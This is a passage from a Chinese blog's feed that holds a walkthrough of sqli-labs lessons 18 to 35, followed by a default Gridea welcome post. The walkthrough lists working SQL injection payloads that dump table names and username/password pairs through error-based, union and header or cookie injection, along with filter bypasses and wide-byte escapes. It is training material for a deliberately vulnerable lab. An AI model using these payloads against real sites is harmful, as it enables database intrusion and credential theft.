' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '1'='1<br>
' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) or '1'='1<br>
' or updatexml(1,concat(0x7e,(select (concat_ws('~',username,password)) from users limit 0,1),0x7e),1) or '1'='1</p>
<p>“基于’的“User-Agent:”报头文报错注入”</p>
<p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
<p>less-19</p>
<p>“基于‘的“Referer:”报头文报错注入”<br>
同less 18 将“User-Agent:”改为“Referer:”</p>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br>
Request.ServerVariables(&quot;HTTP_REFERER&quot;)的用法是防外连接。</p>
<p>less-20</p>
<p>“基于‘的“Cookie:”报头文报错注入”<br>
payload:<br>
' union select 1,2,group_concat(schema_name)from information_schema.schemata#<br>
' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'#<br>
' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'#<br>
' union select 1,2,group_concat(concat_ws('~',username,password))from security.users#</p>
<p>less-21</p>
<p>登陆后发现uname为看不懂的字符，查看源码后发现它会将cookie进行BASE64转码<br>
将uname=admin加'再进行BASE64转码后发送，看到包裹信息为'),找到注入点<br>
（可以使用burp抓包在进行转码）<br>
剩余同less-20</p>
<p>less-22</p>
<p>同less-21一样查看包裹信息为&quot;<br>
剩余同less-21需要进行BASE64编码后</p>
<p>less23</p>
<p>无法注释<br>
，用or 1=1闭合<br>
，，用特殊注释符;%00注释<br>
,,,updatexml<br>
同less1</p>
<p>less24</p>
<p>二次注入<br>
二次注入原理<br>
二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p>二次注入，可以概括为以下两步:</p>
<p>第一步：插入恶意数据<br>
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
<p>第二步：引用恶意数据<br>
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
<p>less25包裹<br>
or and双写绕过<br>
后|| 1=1闭合</p>
<p>less25a无包裹</p>
<p>less26</p>
<p>or and， 双写<br>
--+注释，;%00<br>
空格，()包裹，|| 1=1闭合，%a0<br>
报错注入</p>
<p>less26a('')</p>
<p>不能报错<br>
联合注入</p>
<p>less27a</p>
<p>1.双引号字符型注入<br>
2.没有错误回显，不能进行报错注入，即无法使用updatexml函数等，但可以进行布尔盲注，因为他有无错误回显，即正确和错误页面返回的页面不同。<br>
3.可以使用union联合注入，延时盲注。<br>
这里演示一下联合注入，其他自行尝试：</p>
<p>less28</p>
<p>发现没有过滤or与and。<br>
过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、空格等，使用%a0等空格的URL编码可以绕过。<br>
过滤了--、#以及/**/。<br>
过滤了两次空格。<br>
过滤了/但没过滤\。<br>
这一关和Less-27a十分相似，可以利用联合注入，布尔盲注，延时注入。</p>
<p>less28a</p>
<p>带括号的双引号字符型注入</p>
<p>less27发现没有过滤or与and，过滤了几个大小写的union和select但是可以用随机大小写绕过，过滤了--、#以及/**/，过滤了两次空格，过滤了/但没过滤\。<br>
所以实际上只过滤了注释与空格，与 Less 26 相似。</p>
<p>less-29</p>
<p>使用jspstudy搭建环境，否则会与less-1一致<br>
下载安装jspstudy后，修改端口为8080，在PHPstudy根目录下找到（/sqli-labs中的tomlat-fils.zip&lt;29~32&gt;解压至jsp根目录，之后打开index.jsp确认URL。</p>
<p>payload：<br>
127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1//正确界面<br>
127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1'&amp;id=1//提示WAF防御<br>
127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1'//报错发现注入点<br>
127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1和127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=2//查看信息<br>
127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1' --+//无异常<br>
127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=1' order by X(X=1,2,3,4) --+//列信息有三列<br>
127.0.0.1:8080/sqli-labs/less-29/index.jsp?id=1&amp;id=-3' union select 1,2,3 --+//联合注入</p>
<p>less-30<br>
（与29相比单引包裹变双引包裹）<br>
但是没有报错信息，无法使用报错注入，可使用联合注入，延时注入</p>
<p>less-31<br>
与29相比单引包裹变双引单括号）<br>
报错注入，联合注入，延时注入</p>
<p>知识点：服务器两层架构<br>
参考：https://www.cnblogs.com/lcamry/p/5762961.html</p>
<p>less-32</p>
<p>此关会对单引号进行转义（自定义过滤）</p>
<p>方法1：payload（宽字节）<br>
-1%df' union select 1,2,3 --+联合注入<br>
(语句中存在单引号的地方也需使用%df)</p>
<p>方法2：payload（自定义闭合）<br>
-1%aa%5c%27 union select 1,2,3 --+联合注入<br>
(%5c:)(%27:')</p>
<p>less-33</p>
<p>addslaches(&quot;)//对双引号进行转义</p>
<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<pre><code>单引号（'）
双引号（&quot;）
反斜杠（\）
NULL
</code></pre>
<p>(%22:&quot;)payload:同32</p>
<p>知识点：宽字节注入<br>
参考文章：https://blog.csdn.net/helloc0de/article/details/76180190<br>
https://blog.csdn.net/heiseweiye/article/details/82723478</p>
<p>宽字节：GB2312、GBK、GB18030、B1G5、Shift_JIS等这选都是常说的宽辛节，实际上只有两字节。宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。<br>
中文、韩文、日文等均存在宽字节，英文默认都是一个字节。<br>
在使用PHP连接MySQL的时候，当设置&quot;set character_set_client=gbk&quot;时会导致一个编码转换的问题。<br>
例子： id=1'  处理 1'     进行编码1%5c%27    带入sql后 id=' and XXXX 此时无法完成注入<br>
id=1%df'  处理 1%df'     进行编码1%df%5c%27    带入sql后 id=1運' and XXXX 此时存在宽字节注入<br>
推荐解码网站：http://www.mytju.com/classcode/tools/urldecode gb2312.asp</p>
<p>less-34</p>
<p>POST方式下进行<br>
使用Burp进行抓包之后，修改并返回信息<br>
传入数据：a%df'<br>
抓包数据：uname=a%25df%2527&amp;passwd=a%25df%2527&amp;submit=Submit<br>
修改数据：uname=a%df%27&amp;passwd=a%df%27&amp;submit=Submit<br>
(%25:%)</p>
<p>less-35</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://kite-007.github.io/post/hello-gridea/</id>
        <link href="https://kite-007.github.io/post/hello-gridea/">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="https://gridea.dev/">Gridea 主页</a><br>
<a href="http://fehey.com/">示例网站</a></p>
<h2 id="特性">特性👇</h2>
<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
<p>🏷️  你可以对文章进行标签分组</p>
<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
<p>未来，它一定会成为你离不开的伙伴</p>
<p>尽情发挥你的才华吧！</p>
<p>😘 Enjoy~</p>
]]></content>
    </entry>
</feed>